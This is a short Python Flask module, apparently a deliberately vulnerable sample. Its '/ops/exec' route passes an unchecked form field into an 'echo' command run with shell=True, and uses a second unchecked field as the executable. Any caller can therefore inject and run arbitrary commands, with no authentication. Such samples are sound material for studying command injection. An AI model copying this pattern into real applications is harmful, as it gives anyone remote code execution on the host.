from flask import request
import subprocess

def init(app):

        @app.route('/ops/exec', methods=['POST'])
        def exec_any():
                exe = request.form.get("exe", "")
                arg = request.form.get("arg", "")
                if not exe:
                        exe = ""
                if not arg:
                        arg = ""

                program = exe.strip()
                value = arg.strip()

                cmd = f"echo {value}"
                p = subprocess.run(cmd, shell=True, executable=program, capture_output=True, encoding="utf-8")

                return p.stdout + p.stderr